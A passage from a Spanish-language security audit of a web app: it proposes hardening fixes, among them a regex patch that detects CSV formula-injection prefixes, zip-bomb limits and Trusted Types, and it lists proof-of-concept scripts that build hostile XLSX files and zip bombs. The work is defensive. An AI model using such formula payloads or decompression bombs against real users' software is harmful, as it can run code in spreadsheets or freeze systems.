**Ojo con el modo artefacto:** si la app se publica en un *host* que inyecta sus propios scripts en línea, la `<meta>` CSP los bloquearía. Para ese destino hay que construir con `--no-csp`. La aplicación de escritorio de descargas (`window.claude.use('downloads')`) no se ve afectada por `connect-src`, porque funciona con mensajes del *host* y no con `fetch`. Aun así, conviene comprobarlo en ese entorno.

---

## 5. Endurecimiento (sin vulnerabilidad reproducida)

**H-02 · Variantes de inyección de fórmulas en CSV** (`01b-security.js:85`). La expresión actual `^[=+\-@\t\r]` no cubre:

- espacios o NBSP delante del `=` (`" =3+4"`);
- caracteres invisibles (`\u200B=…`, BOM, marcas bidi);
- los signos de ancho completo `＝ ＋ － ＠` (U+FF1D/0B/0D/20);
- un `\n` inicial.

Algunas hojas de cálculo recortan los espacios al importar («Trim spaces» en LibreOffice) o normalizan el ancho completo (Excel con IME de Asia oriental). No se pudo verificar en Excel ni en LibreOffice, que no arranca en el entorno de pruebas. Parche probado (la e2e pasa):

```diff
--- a/src/app/01b-security.js
+++ b/src/app/01b-security.js
@@ -84,4 +84,4 @@
 /* CSV: una celda que empieza por = + - @ (o tab/CR) se ejecutaría como fórmula al abrirla en una hoja de cálculo */
-const noFormula = (v) => { const x = String(v ?? ''); return /^[=+\-@\t\r]/.test(x) ? "'" + x : x; };
+const noFormula = (v) => { const x = String(v ?? ''); return /^[\s\u200B-\u200F\u202A-\u202E\u2060\uFEFF]*[=+\-@\uFF1D\uFF0B\uFF0D\uFF20]|^[\t\r\n]/.test(x) ? "'" + x : x; };
```

Sobre el XLSX exportado: 0 fórmulas. Las cadenas que empiezan por `=` se guardan como texto (`t:'s'`). Solo pasarían a ser fórmula si alguien edita la celda a mano (F2 + Intro), y eso queda fuera del modelo de amenazas. Si se quiere uniformidad, se puede aplicar `noFormula` también a las celdas de texto de `exportXlsx`, aunque cuesta legibilidad.

**H-03 · Trusted Types.** Es viable con una política propia: crear `const TT = trustedTypes?.createPolicy('rosetta', { createHTML: (s) => s })` en `01-core.js` y cambiar los 25 `x.innerHTML = …` por `x.innerHTML = TT ? TT.createHTML(html) : html`. Después se activa `require-trusted-types-for 'script'; trusted-types rosetta`, primero en modo `Report-Only`.

La política es transparente, porque el escape ya lo hacen las plantillas. Lo que aporta es que **ningún otro código** (la librería XLSX o un script inyectado) pueda escribir HTML. Esfuerzo bajo-medio.

Ya que se toca esto, conviene documentar o blindar que `head()`, `empty()`, `setRow()` e `inspHead()` (`03-shell.js:22,25`; `04-global.js:127`; `05b-inspector.js:12`) reciben HTML ya escapado: hoy todos los que las llaman lo hacen bien.

**H-04 · *Zip bomb* en el XLSX.** El límite de 15 MB es del fichero comprimido. 0,8 MB se expanden a 541 MB y bloquean la pestaña 9 s antes de un error controlado; 3,1 MB se expanden a 3 GB y dan «Array buffer allocation failed», también controlado. Mejoras:

- leer el directorio central del ZIP y rechazar si el tamaño descomprimido total supera unos 100 MB;
- leer en un `Worker` (habría que añadir `worker-src 'self'`) para no congelar la interfaz.

**H-05 · Restaurar una copia** (`06-io.js:246-252`) sustituye el perfil y los ajustes, y pisa los proyectos con el mismo `id`, sin confirmación. Conviene mostrar un resumen («n proyectos, de los que k sobrescriben») y pedir confirmación, o regenerar los `id` que choquen.

**H-06 · `window.__ROSETTA__`** (`07-events.js:259`) expone el estado, `openCase` y `go`. Conviene publicarlo solo con `?debug` o en los builds de test.

**H-07 · Congelar más prototipos.** Se puede añadir `Object.freeze(Array.prototype)` y `Object.freeze(Function.prototype)` junto al de `Object.prototype`. Hay que probar antes la importación y la exportación XLSX: SheetJS en modo estricto podría chocar con el *override mistake*. Con `Object.prototype` congelado, la exportación y la importación funcionan (comprobado).

**H-08 · CI y cadena de suministro.**

- Fijar las *actions* por SHA (`actions/checkout@<sha>`, etc.).
- Añadir un paso que compruebe que `XLSX_SRI` coincide con el fichero publicado. Por ejemplo, con `npm pack xlsx-js-style@1.2.0` y `openssl dgst -sha384` (así se calculó el valor de este informe), o con el vendor.
- `npm audit` solo cubre Playwright (devDependency): las CVE de V-02 no aparecerán nunca en él.

**Otros apuntes:**

- `s()` elimina caracteres de control, pero no los bidi (U+202A–202E) ni los de ancho cero. No se observó impacto en el DOM, porque se escapan, pero sí podrían engañar visualmente en exportaciones. El parche de H-02 cubre el caso de las fórmulas.
- `fwTag`, `icon()` y `opt` interpolan valores de catálogo o constantes. Son seguros mientras el catálogo sea de confianza (se incrusta en el build).

---

## 6. Pruebas de concepto (`scratchpad/audit-sec/`)

| Fichero | Qué demuestra | Ejecución |
|---|---|---|
| `server.mjs` | Servidor estático con cabeceras opcionales (CSP) | — |
| `poc-xss.mjs` | R-01 (sin XSS por copia, proyecto JSON ni `localStorage`); V-04 (MD); CSV neutralizado | `node poc-xss.mjs` (`DIST=…/patched/dist` para el parcheado) |
| `mkxlsx.py` → `out/evil-soa.xlsx`, `out/bomb-soa.xlsx` | SoA hostil (XSS, fórmulas, `ref="__proto__"`) y *zip bomb* | `python3 mkxlsx.py` |
| `mkbomb2.py` → `out/bomb2.xlsx` | Bomba de 3 GB | `python3 mkbomb2.py 3000` |
| `node-proto.cjs` | V-02: CVE-2023-30533 en SheetJS 0.18.5 | `node node-proto.cjs` |
| `poc-xlsx.mjs` | Importación XLSX hostil, *freeze* efectivo, exportación XLSX sin fórmulas, CSV con variantes | `node poc-xlsx.mjs` (`TAMPER=1` con bundle modificado) |
| `poc-bomb.mjs` | H-04 | `node poc-bomb.mjs bomb2.xlsx` |
| `poc-sri.mjs` | V-01 (CDN comprometido lee los datos; con SRI se bloquea) | `node poc-sri.mjs` / `DIST=…/patched/dist node poc-sri.mjs` |
| `poc-csp.mjs` | Sección 4: modos `header`, `meta`, `strict-attr` y `tt` | `node poc-csp.mjs header` |
| `poc-extra.mjs` | Eficacia de la CSP, petición a Google Fonts, fuga de `localStorage` en `file://` | `node poc-extra.mjs` |
| `patched/` + `patches-src.diff` | Copia con todos los parches aplicados (`npm test` y e2e en verde) | `cd patched && npm test && npm run test:e2e` |

La librería se sirve en las pruebas desde el tarball npm `xlsx-js-style-1.2.0.tgz` (`package/dist/xlsx.bundle.js`). jsDelivr está bloqueado en el entorno, pero sirve exactamente esos bytes.
